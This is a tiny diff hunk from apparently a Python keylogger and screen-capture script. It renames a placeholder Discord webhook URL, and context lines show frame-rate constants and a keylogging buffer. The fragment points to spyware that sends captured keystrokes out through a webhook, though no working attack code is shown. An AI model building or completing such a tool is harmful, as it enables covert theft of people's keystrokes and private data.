@@ -13,7 +13,7 @@ FPS = 20
 DURATION = 15
 FRAME_COUNT = FPS * DURATION
 
-WEBHOOK_URL = "YOUR_WEBHOOK_HERE" # Your discord webhook
+WEBHOOK_URL = "YOUR_WEBHOOK_URL" # Your discord webhook
 
 # --- Global variables for keylogging ---
 logged_keys_buffer = []
